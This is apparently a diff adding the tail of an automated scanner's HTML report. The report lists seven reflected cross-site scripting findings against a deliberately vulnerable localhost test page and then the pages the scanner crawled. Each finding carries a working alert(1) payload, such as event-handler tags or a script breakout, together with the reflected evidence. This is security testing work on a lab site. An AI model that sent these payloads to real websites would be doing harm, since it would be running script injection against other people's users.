+<li>reflected_xss_auto @ http://localhost/testwebsite/vulnauth/welcome.php?x="><details/open ontoggle=alert(1)> - param: x - payload: &quot;&gt;&lt;details/open ontoggle=alert(1)&gt;<br/>Evidence: &#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;details/open ontoggle=alert(1)&gt;&lt;/p&gt;&lt;h3&gt;Stored Usernames:&lt;</li>
+<li>reflected_xss_auto @ http://localhost/testwebsite/vulnauth/welcome.php?x="><a href="javascript:alert(1)">click</a> - param: x - payload: &quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;<br/>Evidence: &#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;Stored User</li>
+<li>reflected_xss_auto @ http://localhost/testwebsite/vulnauth/welcome.php?x=</script><script>alert(1)</script> - param: x - payload: &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;<br/>Evidence: &#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;&lt;h3&gt;Stored Usernames:&lt;</li>
+<li>reflected_xss_auto @ http://localhost/testwebsite/vulnauth/welcome.php?x="><video src onerror=alert(1)> - param: x - payload: &quot;&gt;&lt;video src onerror=alert(1)&gt;<br/>Evidence: &#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;video src onerror=alert(1)&gt;&lt;/p&gt;&lt;h3&gt;Stored Usernames:&lt;/h3&gt;</li>
+<li>reflected_xss_auto @ http://localhost/testwebsite/vulnauth/welcome.php?x="><audio src onerror=alert(1)> - param: x - payload: &quot;&gt;&lt;audio src onerror=alert(1)&gt;<br/>Evidence: &#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;audio src onerror=alert(1)&gt;&lt;/p&gt;&lt;h3&gt;Stored Usernames:&lt;/h3&gt;</li>
+<li>reflected_xss_auto @ http://localhost/testwebsite/vulnauth/welcome.php?x="><marquee onstart=alert(1)> - param: x - payload: &quot;&gt;&lt;marquee onstart=alert(1)&gt;<br/>Evidence: &#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;marquee onstart=alert(1)&gt;&lt;/p&gt;&lt;h3&gt;Stored Usernames:&lt;/h3&gt;&lt;u</li>
+<li>reflected_xss_auto @ http://localhost/testwebsite/vulnauth/welcome.php?x="><math><mtext><mglyph onload=alert(1)> - param: x - payload: &quot;&gt;&lt;math&gt;&lt;mtext&gt;&lt;mglyph onload=alert(1)&gt;<br/>Evidence: &#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;math&gt;&lt;mtext&gt;&lt;mglyph onload=alert(1)&gt;&lt;/p&gt;&lt;h3&gt;Stored Userna</li>
+</ul>
+</div>
+<div class="card">
+<h2>Pages Crawled (detailed)</h2>
+<div style="margin-bottom:8px"><strong>http://localhost/testwebsite/vulnauth/login.php</strong></div>
+<div style="margin-bottom:8px"><strong>http://localhost/testwebsite/vulnauth/register.php</strong></div>
+<div style="margin-bottom:8px"><strong>http://localhost/testwebsite/vulnauth/welcome.php</strong></div>
+</div>
+</body>
+</html>
